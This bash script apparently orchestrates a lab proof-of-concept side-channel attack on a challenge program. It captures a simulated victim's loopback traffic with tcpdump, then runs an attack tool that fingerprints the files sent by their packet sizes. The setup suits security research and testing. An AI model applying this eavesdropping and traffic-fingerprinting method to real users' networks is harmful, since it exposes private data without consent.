#!/bin/bash
set -e

# always rebuild.  signatures depend on the compression algorithm used as well as whether the SC vuln is there
REBUILD=1 

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi

# step 1, start tcpdump
echo "Start eavesdropping on user"
/usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 9002 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user send an unknown file 
echo "User performs transactions"
expect victim.expect  > /dev/null 

# step 3, stop tcpdump
sleep 1
echo "Stop eavesdropping"
kill $TCPDUMP_PID > /dev/null

# step 4, have the attacker build the file chunk size signature database
if [ $REBUILD -eq 1 ]; then
    echo "Start building a file->size signature DB"
    python ./file_SC_attack.py 127.0.0.1 9002 build ../../../challenge_program/data/files lo file_id_db.json > /dev/null
else
    echo "Skipping building of file fingerprint table, if you want to rebuild it run this script as ./malicious_file_SC.sh rebuild"
fi

# step 5, have the attacker guess the user's search term
echo "Find what files the user sent based on the packet sizes extracted from the pcap"
python ./file_SC_attack.py 127.0.0.1 9002 find file_id_db.json usertraffic.pcap

